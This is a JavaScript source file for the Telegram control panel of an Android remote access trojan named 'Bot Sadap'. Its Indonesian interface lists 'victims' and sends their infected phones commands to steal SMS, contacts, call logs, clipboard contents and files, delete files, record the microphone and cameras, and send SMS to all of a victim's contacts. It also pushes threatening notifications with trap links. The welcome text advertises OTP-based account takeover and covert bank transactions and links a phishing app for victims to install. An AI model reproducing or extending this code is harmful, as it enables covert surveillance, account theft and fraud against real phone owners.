/**
 * Telegram Bot Implementation
 */

const telegramBot = require('node-telegram-bot-api');
const config = require('./config');
const utils = require('./utils');

class TelegramBotHandler {
  constructor(sharedState) {
    this.bot = new telegramBot(config.token, { polling: true });
    this.adminId = config.id;
    this.suryaId = config.surya;
    this.sharedState = sharedState;
    
    // Initialize bot
    this.setupEventHandlers();
  }

  /**
   * Set up all event handlers for Telegram bot
   */
  setupEventHandlers() {
    // Handle incoming messages
    this.bot.on('message', (message) => this.handleMessage(message));
    
    // Handle callback queries (button clicks)
    this.bot.on('callback_query', (callbackQuery) => this.handleCallbackQuery(callbackQuery));
  }

  /**
   * Handle incoming messages
   * @param {Object} message - Telegram message object
   */
  async handleMessage(message) {
    const chatId = message.chat.id;
    const text = message.text || '';
    
    // Only process messages from authorized users
    if (chatId != this.adminId && chatId != this.suryaId) {
      this.bot.sendMessage(chatId, 'Jika Mengalami Bug Anda Bisa Report Ke @SisuryaOfficial');
      return;
    }
    
    // Handle reply messages
    if (message.reply_to_message) {
      this.handleReplyMessage(message);
      return;
    }
    
    // Handle commands
    if (text.startsWith('/')) {
      this.handleCommand(chatId, text);
      return;
    }
    
    // Handle predefined keyboard buttons
    if (text === '📖 DAFTAR KORBAN') {
      this.showDeviceList(chatId);
      return;
    }
    
    if (text === '☠️ SADAP KORBAN') {
      this.showDeviceSelectionForHacking(chatId);
      return;
    }
  }

  /**
   * Handle reply messages (for interactive conversations)
   * @param {Object} message - Telegram message object
   */
  handleReplyMessage(message) {
    const replyText = message.reply_to_message.text || '';
    const text = message.text || '';
    
    // Handle different reply scenarios
    if (replyText.includes('🔥 Masukkan nomor untuk mengirim SMS dari perangkat target')) {
      this.sharedState.currentNumber = text;
      this.bot.sendMessage(this.adminId,
        "🔥 Ketik teks pesan\n\n" +  
        "⚡ Ketik isi pesan yang akan dikirim ke nomor yang ditentukan",
        {reply_markup: {force_reply: true}}
      );
    }
    else if (replyText.includes('🔥 Ketik teks pesan')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, 
        `send_message:${this.sharedState.currentNumber}/${text}`);
      
      this.sharedState.currentNumber = '';
      this.sharedState.currentUuid = '';
      
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('🔥 Ketik pesan untuk dikirim ke semua kontak target')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, 
        `send_message_to_all:${text}`);
      
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('🤖 Berikan Saya Jalur Folder Yang Anda Ingin Ambil')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `file:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('🔥 Masukkan path file yang ingin dihapus')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `delete_file:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('🤖 Berikan Saya Waktu Merekam Suara Korban')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `microphone:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙖𝙢𝙖 𝙬𝙖𝙠𝙩𝙪 𝙮𝙖𝙣𝙜 𝙖𝙣𝙙𝙖 𝙞𝙣𝙜𝙞𝙣𝙠𝙖𝙣 𝙖𝙜𝙖𝙧 𝙠𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖 𝙢𝙚𝙧𝙚𝙠𝙖𝙢')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `rec_camera_main:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `rec_camera_selfie:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('🤖 Tulis pesan untuk ditampilkan di tengah layar')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `toast:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('°• Tuliskan teks ancaman kepada korban')) {
      this.sharedState.currentTitle = text;
      this.bot.sendMessage(this.adminId,
        '🔥 Tambahin link jebakan atau link apa aja\n\n' +  
        '⚡ Pas korban ngeklik pesan, link yang lo masukin bakal kebuka otomatis',
        {reply_markup: {force_reply: true}}
      );
    }
    else if (replyText.includes('🔥 Tambahin link jebakan atau link apa aja')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, 
        `show_notification:${this.sharedState.currentTitle}/${text}`);
      
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
    else if (replyText.includes('Kirim tautan musik yang anda inginkan')) {
      this.sendMessageToDevice(this.sharedState.currentUuid, `play_audio:${text}`);
      this.sharedState.currentUuid = '';
      this.sendSuccessMessage(this.adminId);
    }
  }

  /**
   * Handle commands
   * @param {String} chatId - Chat ID
   * @param {String} command - Command text
   */
  handleCommand(chatId, command) {
    switch (command) {
      case '/start':
        this.sendWelcomeMessage(chatId);
        break;
      case '/help':
        this.sendHelpMessage(chatId);
        break;
      case '/menu':
        this.sendMenuMessage(chatId);
        break;
      default:
        // Unknown command
        this.bot.sendMessage(chatId, 'Perintah tidak dikenal. Ketik /help untuk bantuan.');
    }
  }

  /**
   * Handle callback queries (button clicks)
   * @param {Object} callbackQuery - Callback query object
   */
  handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    // Handle device selection
    if (command === 'device') {
      this.showDeviceMenu(msg, uuid);
      return;
    }
    
    // Handle various device commands
    switch (command) {
      case 'calls':
      case 'contacts':
      case 'messages':
      case 'apps':
      case 'device_info':
      case 'clipboard':
      case 'camera_main':
      case 'camera_selfie':
      case 'vibrate':
      case 'stop_audio':
        this.sendMessageToDevice(uuid, command);
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.sendSuccessMessage(this.adminId);
        break;
      
      case 'location':
        this.sendMessageToDevice(uuid, command);
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '🤖 Maaf Fitur Ini Tidak Dapat Di Gunakan Karena Masih Bug/Beta\n\n' +
          '~ Salam Maaf Dari @SisuryaOfficial',
          this.getMainKeyboard()
        );
        break;
      
      case 'send_message':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId, 
          '°• Masukkan nomor untuk mengirim pesan SMS dari perangkat korban\n\n' +
          '• Masukkan nomor telepon untuk mengirim pesan kepadanya, harap tulis nomor yang disertai dengan kode negara',
          {reply_markup: {force_reply: true}}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'send_message_to_all':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '°• Tulis pesan untuk dikirim ke semua kontak korban\n\n' +
          '• Anda harus memberikan izin pada aplikasi agar dapat berfungsi untuk Anda',
          {reply_markup: {force_reply: true}}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'file':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '🤖 Berikan Saya Jalur Folder Yang Anda Ingin Ambil\n\n' +
          'Contoh: jika ingin mengambil hasil download dia anda bisa kirim teks /Download/ Jika mau lihat hasil foto anda bisa lihat di /DCIM/Camera/ , fitur ini berfungsi di semua folder kecuali data,obb,media, storage utama.',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'delete_file':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '🤖 Berikan Saya Jalur Folder Yang Mau Di Hapus\n\n' +
          '~ Duh Sayangnya Fitur Ini Suka Bug Dan Lama Merespon Karna Fitur Ini Membuat Server Cepat Penuh. Maaf Ya',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'microphone':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '🤖 Berikan Saya Waktu Merekam Suara Korban\n\n' +
          'Tulis durasi rekaman rekaman dalam hitungan detik\nContoh : lu kirim 10 sama aja lu rekam dia 10dtk',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'toast':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '🤖 Tulis pesan untuk ditampilkan di tengah layar\n\n' +
          'Dev By @SisuryaOfficial',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'show_notification':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          '°• Tuliskan teks ancaman kepada korban\n\n' +
          '• Notifikasi akan dikirim ke bilah notifikasi\n\nJika Sudah Kirim Lu Bisa Kirim Teks bebas ntar pas ada tulisan arab',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
      
      case 'play_audio':
        this.bot.deleteMessage(this.adminId, msg.message_id);
        this.bot.sendMessage(this.adminId,
          'Kirim tautan musik yang anda inginkan\n\n' +
          '~ Btw ga bisa lu kirim musik/voice langsung dari sini lu harus upload ke https://top4top.io dan kirim link musik/voice mu bot in\n\nContoh Link:\nhttps://g.top4top.io/m_3070dpyfe0.mp3i',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        this.sharedState.currentUuid = uuid;
        break;
    }
  }

  /**
   * Send welcome message
   * @param {String} chatId - Chat ID
   */
  sendWelcomeMessage(chatId) {
    this.bot.sendMessage(chatId,
      '𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝙎𝙚𝙧𝙫𝙚𝙧 𝘽𝙤𝙩 𝙎𝙖𝙙𝙖𝙥\n\n' +
      'Terimakasih Telah Bergabung Di Server Kami Dan Anda Ingin Bertanya Apa Itu Bot Sadap?\n\n𝘽𝙤𝙩 𝙎𝙖𝙙𝙖𝙥 merupakan malware Trojan yang lebih kompleks daripada RAT. Sebagaimana RAT, 𝘽𝙤𝙩 𝙎𝙖𝙙𝙖𝙥 dapat mengakses perangkat korban secara tidak sah untuk melakukan berbagai tindakan seperti mengambil akun sosmed melalui otp, hack kamera depan, melihat semua otp, menghapus dan melihat Gallery atau file hingga melakukan transaksi tanpa sepengetahuan pemilik akun bank.\n\nUpdate By @TricksAndroid2024\nDev By @SisuryaOfficial\n\n\nUntuk Cara Pemakaian Bot Ini Sangatlah Gampang Karna Anda Hanya Memberikan Aplikasi Kepada Korban, Aplikasinya Yang Mana Sih? Untuk Aplikasinya Developer Sudah Memberikan Anda Aplikasi Dan Aplikasi Itu Seperti Virus Dan Anda Hanya Memberikannya Ke Korban Lalu Control Device Dia Melalui 𝘽𝙤𝙩 𝙎𝙖𝙙𝙖𝙥 Ini\n\nini aplikasi phising bot ini\nhttps://t.me/tricksandroid2024/1344',
      this.getMainKeyboard()
    );
  }

  /**
   * Send help message
   * @param {String} chatId - Chat ID
   */
  sendHelpMessage(chatId) {
    this.bot.sendMessage(chatId,
      '📚 *BANTUAN PENGGUNAAN BOT*\n\n' +
      'Berikut adalah perintah yang tersedia:\n\n' +
      '• /start - Memulai bot dan melihat pesan selamat datang\n' +
      '• /help - Menampilkan pesan bantuan ini\n' +
      '• /menu - Menampilkan menu utama\n\n' +
      'Untuk menggunakan bot ini, Anda perlu:\n' +
      '1. Memberikan aplikasi ke target\n' +
      '2. Menunggu target menginstal dan menjalankan aplikasi\n' +
      '3. Menggunakan tombol "📖 DAFTAR KORBAN" untuk melihat perangkat yang terhubung\n' +
      '4. Menggunakan tombol "☠️ SADAP KORBAN" untuk mengakses fitur-fitur sadap\n\n' +
      'Jika mengalami masalah, hubungi @SisuryaOfficial',
      {
        parse_mode: "Markdown",
        ...this.getMainKeyboard()
      }
    );
  }

  /**
   * Send menu message
   * @param {String} chatId - Chat ID
   */
  sendMenuMessage(chatId) {
    this.bot.sendMessage(chatId,
      '🔍 *MENU UTAMA*\n\n' +
      'Silakan pilih opsi di bawah ini:',
      {
        parse_mode: "Markdown",
        ...this.getMainKeyboard()
      }
    );
  }

  /**
   * Show list of connected devices
   * @param {String} chatId - Chat ID
   */
  showDeviceList(chatId) {
    if (this.sharedState.clients.size === 0) {
      this.bot.sendMessage(chatId,
        'Maaf Teman 🥲\n\nSepertinya Tidak Ada Korban Yang Menginstal Aplikasi\n' + 
        '~ Untuk Munculkan Korban Silahkan Berikan Aplikasi Ke Target'
      );
      return;
    }
    
    let text = 'Ini daftar korban yang berhasil menginstal aplikasi:\n\n';
    this.sharedState.clients.forEach((value, key) => {
      text += `• Tipe perangkat : <b>${value.model}</b>\n` +
        `• baterai : <b>${value.battery}</b>\n` +
        `• versi Android : <b>${value.version}</b>\n` +
        `• Tipe jaringan : <b>${value.provider}</b>\n\n`;
    });
    
    this.bot.sendMessage(chatId, text, {parse_mode: "HTML"});
  }

  /**
   * Show device selection for hacking
   * @param {String} chatId - Chat ID
   */
  showDeviceSelectionForHacking(chatId) {
    if (this.sharedState.clients.size === 0) {
      this.bot.sendMessage(chatId,
        'Maaf Teman 🥲\n\nSepertinya Tidak Ada Korban Yang Menginstal Aplikasi\n' + 
        '~ Untuk Munculkan Korban Silahkan Berikan Aplikasi Ke Target'
      );
      return;
    }
    
    const deviceListKeyboard = [];
    this.sharedState.clients.forEach((value, key) => {
      deviceListKeyboard.push([{
        text: value.model,
        callback_data: 'device:' + key
      }]);
    });
    
    this.bot.sendMessage(chatId, 'Pilih Korban Yang Anda Ingin Retas', {
      "reply_markup": {
        "inline_keyboard": deviceListKeyboard,
      },
    });
  }

  /**
   * Show device menu
   * @param {Object} msg - Message object
   * @param {String} uuid - Device UUID
   */
  showDeviceMenu(msg, uuid) {
    const deviceModel = this.sharedState.clients.get(uuid)?.model || 'Unknown';
    
    this.bot.editMessageText(
      `Pilih Fitur Yang Anda Ingin Gunakan Untuk Sadap Prangkat : <b>${deviceModel}</b>`, 
      {
        width: 10000,
        chat_id: this.adminId,
        message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '🇩‌🇪‌🇻‌🇮‌🇨‌🇪‌ - 🇲‌🇪‌🇳‌🇺‌',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {text: 'ᴀᴘʟɪᴋᴀsɪ', callback_data: `apps:${uuid}`},
              {text: 'ɪɴғᴏ ʜᴘ', callback_data: `device_info:${uuid}`}
            ],
            [
              {text: 'ʟᴏᴋᴀsɪ', callback_data: `location:${uuid}`},
              {text: 'ᴛᴇᴋs ʟᴀʏᴀʀ', callback_data: `toast:${uuid}`}
            ],
            [
              {text: 'ʀɪᴡᴀʏᴀᴛ ᴛᴇʟᴘ', callback_data: `calls:${uuid}`},
              {text: 'ᴋᴏɴᴛᴀᴋ', callback_data: `contacts:${uuid}`}
            ],
            [
              {
                text: '🇫‌🇮‌🇱‌🇪‌ - 🇲‌🇪‌🇳‌🇺‌‌',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {text: 'ᴀᴍʙɪʟ ғɪʟᴇ', callback_data: `file:${uuid}`},
              {text: 'ʜᴀᴘᴜs ғɪʟᴇ', callback_data: `delete_file:${uuid}`}
            ],
            [
              {
                text: '🇩‌🇪‌🇫‌🇦‌🇺‌🇱‌🇹‌ - 🇲‌🇪‌🇳‌🇺‌‌‌‌',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {text: 'ᴛᴇᴋs ᴄᴏᴘʏ', callback_data: `clipboard:${uuid}`},
              {text: 'ʀᴇᴋᴀᴍ sᴜᴀʀᴀ', callback_data: `microphone:${uuid}`},
            ],
            [
              {text: 'ᴋᴀᴍᴇʀᴀ ʙᴇʟᴀᴋᴀɴɢ', callback_data: `camera_main:${uuid}`},
              {text: 'ᴋᴀᴍᴇʀᴀ ᴅᴇᴘᴀɴ', callback_data: `camera_selfie:${uuid}`}
            ],
            [
              {text: 'ᴋɪʀɪᴍ ɢᴇᴛᴀʀᴀɴ', callback_data: `vibrate:${uuid}`},
              {text: 'ʙᴜᴀᴛ ɴᴏᴛɪғɪᴋᴀsɪ', callback_data: `show_notification:${uuid}`}
            ],
            [
              {
                text: '🇸‌🇴‌🇺‌🇳‌🇩‌ - 🇲‌🇪‌🇳‌🇺‌',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {text: 'ʙᴇʀɪᴋᴀɴ sᴏᴜɴᴅ', callback_data: `play_audio:${uuid}`},
              {text: 'ʙᴇʀʜᴇɴᴛɪ sᴏᴜɴᴅ', callback_data: `stop_audio:${uuid}`},
            ],
            [
              {
                text: '🇸‌🇲‌🇸‌ - 🇲‌🇪‌🇳‌🇺‌',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {
                text: 'sᴍs ᴛᴇʀʙᴀʀᴜ & ᴅᴜʟᴜ',
                callback_data: `messages:${uuid}`
              }
            ],
            [
              {
                text: 'ᴋɪʀɪᴍ sᴍs ᴋᴇ sᴇᴍᴜᴀ ᴋᴏɴᴛᴀᴋ',
                callback_data: `send_message_to_all:${uuid}`
              }
            ],
            [
              {
                text: '🇮‌🇳‌🇫‌🇴‌🇲‌🇦‌🇸‌🇮‌ 🇩‌🇪‌🇻‌🇪‌🇱‌🇴‌🇵‌🇪‌🇷‌ ',
                url: `https://telegra.ph/Maaf-Fitur-Tidak-Tersedia-05-28`
              }
            ],
            [
              {
                text: '𝙾𝚆𝙽𝙴𝚁 𝙱𝚈 @𝚂𝙸𝚂𝚄𝚁𝚈𝙰𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻',
                url: `https://t.me/SisuryaOfficial`
              }
            ],
            [
              {
                text: 'CHANNEL UPDATE',
                url: `https://t.me/tricksandroid2024`
              }
            ],
          ]
        },
        parse_mode: "HTML"
      }
    );
  }

  /**
   * Send success message
   * @param {String} chatId - Chat ID
   */
  sendSuccessMessage(chatId) {
    this.bot.sendMessage(chatId,
      '🤖 Berhasil Menjalankan Tools\n\n' +
      'Dev By @SisuryaOfficial',
      this.getMainKeyboard()
    );
  }

  /**
   * Send message to device
   * @param {String} uuid - Device UUID
   * @param {String} message - Message to send
   */
  sendMessageToDevice(uuid, message) {
    this.sharedState.sendToDevice(uuid, message);
  }

  /**
   * Get main keyboard
   * @returns {Object} - Keyboard markup
   */
  getMainKeyboard() {
    return {
      parse_mode: "HTML",
      "reply_markup": {
        "keyboard": [["📖 DAFTAR KORBAN"], ["☠️ SADAP KORBAN"]],
        'resize_keyboard': true
      }
    };
  }

  /**
   * Send document to admin
   * @param {Object} file - File object
   * @param {String} source - Source of the file
   */
  async sendDocument(file, source) {
    try {
      await this.bot.sendDocument(this.adminId, file.buffer, {
        caption: `NOTIFIKASI TERBARU DARI ${source}`,
        filename: file.originalname,
        contentType: 'application/txt',
      });
    } catch (error) {
      console.error('Error sending document to Telegram:', error);
    }
  }

  /**
   * Send text to admin
   * @param {String} text - Text to send
   * @param {String} source - Source of the text
   */
  async sendText(text, source) {
    try {
      await this.bot.sendMessage(this.adminId, `✈️ NOTIFIKASI TERBARU DARI ${source}\n\n${text}`);
    } catch (error) {
      console.error('Error sending text to Telegram:', error);
    }
  }

  /**
   * Send location to admin
   * @param {Object} location - Location object
   * @param {String} source - Source of the location
   */
  async sendLocation(location, source) {
    try {
      await this.bot.sendLocation(this.adminId, location.lat, location.lon);
      await this.bot.sendMessage(this.adminId, `°• Lokasi Korban <b>${source}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"});
    } catch (error) {
      console.error('Error sending location to Telegram:', error);
    }
  }

  /**
   * Notify new device connected
   * @param {Object} device - Device information
   */
  notifyNewDevice(device) {
    this.bot.sendMessage(this.adminId,
      `📱𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗕𝗔𝗥𝗨\n\n` +
      `• MODEL HP : <b>${device.model}</b>\n` +
      `• BATRAI : <b>${device.battery}</b>\n` +
      `• VERSI : <b>${device.version}</b>\n` +
      `• SIM AKTIF : <b>${device.provider}</b>\n\nDev By @SisuryaOfficial`,
      {parse_mode: "HTML"}
    );
  }

  /**
   * Notify device disconnected
   * @param {Object} device - Device information
   */
  notifyDeviceDisconnected(device) {
    this.bot.sendMessage(this.adminId,
      `📱𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗢𝗨𝗧\n\n` +
      `• MODEL HP : <b>${device.model}</b>\n` +
      `• BATRAI : <b>${device.battery}</b>\n` +
      `• VERSI : <b>${device.version}</b>\n` +
      `• SIM AKTIF : <b>${device.provider}</b>\n\nDev By @SisuryaOfficial`,
      {parse_mode: "HTML"}
    );
  }
}

module.exports = TelegramBotHandler;
